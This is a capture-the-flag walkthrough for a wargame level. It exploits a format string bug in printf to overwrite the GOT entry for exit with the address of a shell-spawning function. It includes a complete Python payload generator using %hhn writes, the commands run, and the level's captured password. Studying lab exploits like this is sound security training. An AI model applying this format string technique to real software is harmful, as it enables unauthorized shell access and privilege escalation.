# Level 05 Walkthrough

## Binary analysis

The binary is vulnerable to a format string attack. The function `n()` reads user input and prints it with `printf`, then calls `exit(1)`. The function `o()` spawns a shell with `system("/bin/sh")` and exits. The goal is to overwrite the GOT entry for `exit` with the address of `o()`, so that when `exit` is called, it jumps to `o()` instead.

Relevant code:
```
080484a4    void o() __noreturn
080484b1        system(line: "/bin/sh")
080484bd        _exit(status: 1)

080484c2    void n() __noreturn
080484e5        char var_20c[0x208]
080484e5        fgets(buf: &var_20c, n: 0x200, fp: __bss_start)
080484f3        printf(format: &var_20c)
080484ff        exit(status: 1)

08048504    int32_t main(int32_t argc, char** argv, char** envp)
0804850a        n()
```

GOT address for `exit`: 0x08049838
Address of `o()`: 0x080484a4

## Exploitation

We use a format string payload to overwrite the GOT entry for `exit` with the address of `o()`, byte by byte, using `%hhn`.

Python script to generate the payload:
```python
from struct import pack
import sys

o_addr = 0x080484a4
exit_got = 0x08049838
addresses = [exit_got, exit_got+1, exit_got+2, exit_got+3]
values = [o_addr & 0xff, (o_addr >> 8) & 0xff, (o_addr >> 16) & 0xff, (o_addr >> 24) & 0xff]
n_arg = 4  # Offset to our addresses on the stack

payload = b''.join(pack("<I", addr) for addr in addresses)
written = len(payload)
fmt = ""
for i, val in enumerate(values):
    to_write = (val - written) % 256
    if to_write == 0:
        fmt += f"%{n_arg + i}$hhn"
    else:
        fmt += f"%{to_write}c%{n_arg + i}$hhn"
    written += to_write

payload += fmt.encode() + b"\n"
with open("payload.txt", "wb") as f:
    f.write(payload)
```

## Commands used

```
(cat payload.txt; cat) | ./level5
ls
cat /home/user/level6/.pass
```

## Result

After running the exploit, we get a shell as level6 and can read the password:

```
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

Copy the password for the next level. 